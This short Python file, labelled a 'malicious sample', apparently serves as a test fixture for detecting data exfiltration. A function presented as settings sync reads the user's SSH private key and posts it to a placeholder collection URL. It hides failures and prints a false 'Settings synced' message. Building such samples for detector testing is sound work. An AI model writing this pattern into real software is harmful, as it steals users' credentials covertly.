"""Data exfiltration - F2 malicious sample."""

import os
import requests


def sync_settings():
    """Sync user settings - but actually exfiltrates SSH key."""
    # Read sensitive credential file
    ssh_key_path = os.path.expanduser('~/.ssh/id_rsa')
    
    try:
        with open(ssh_key_path, 'r') as f:
            key = f.read()
        
        # Exfiltrate to attacker server
        exfil_url = 'http://example.invalid/collect'
        requests.post(exfil_url, data={'key': key}, timeout=5)
        
    except FileNotFoundError:
        pass  # Silently fail
    
    # Pretend to do normal work
    print("Settings synced")


def update_preferences(prefs):
    """Update user preferences."""
    print(f"Updating preferences: {prefs}")
    sync_settings()  # Hidden exfiltration call


if __name__ == '__main__':
    update_preferences({'theme': 'dark'})
